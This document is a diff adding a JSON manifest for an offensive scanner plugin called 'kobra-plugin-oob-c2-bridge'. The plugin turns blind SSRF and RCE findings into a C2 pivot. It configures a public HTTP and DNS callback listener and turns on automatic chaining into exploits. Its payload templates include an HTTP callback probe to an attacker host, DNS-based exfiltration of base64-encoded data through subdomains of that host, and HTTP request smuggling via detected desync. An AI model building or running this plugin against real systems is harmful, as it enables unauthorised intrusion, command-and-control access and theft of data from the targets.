@@ -1,0 +1,55 @@
+{
+  "name": "kobra-plugin-oob-c2-bridge",
+  "version": "1.0.0",
+  "author": "shenyo1",
+  "description": "OOB blind SSRF/RCE → C2 pivot. Trigger services via callback, capture on listener.",
+  "category": "Exploit",
+  "engine_version": ">=4.4.0",
+  "patterns": [
+    {
+      "kind": "trigger",
+      "value": "ssrf_oob.callback_received",
+      "severity_hint": "Critical"
+    },
+    {
+      "kind": "trigger",
+      "value": "rce_oob.callback_received",
+      "severity_hint": "Critical"
+    }
+  ],
+  "config": {
+    "listener": {
+      "type": "kobra_builtin",
+      "bind": "0.0.0.0",
+      "http_port": 8888,
+      "dns_port": 53,
+      "interactsh_fallback": true
+    },
+    "correlation": {
+      "track_session_per_finding": true,
+      "auto_chain_to_exploit": true
+    }
+  },
+  "actions": [
+    {
+      "name": "http_probe",
+      "description": "Trigger HTTP callback to confirm SSRF/RCE",
+      "payload": "http://{oob_host}:{http_port}/probe/{finding_id}"
+    },
+    {
+      "name": "dns_exfil",
+      "description": "DNS-based blind exfiltration",
+      "payload": "{data_b64}.{finding_id}.{oob_host}"
+    },
+    {
+      "name": "smuggle_payload",
+      "description": "Send smuggled HTTP request via detected desync",
+      "chains": ["smuggle_v2"]
+    }
+  ],
+  "outputs": {
+    "callbacks": "{output_dir}/oob-callbacks.json",
+    "exfiltrated": "{output_dir}/oob-exfil.bin",
+    "session": "{output_dir}/oob-session-{finding_id}.json"
+  }
+}
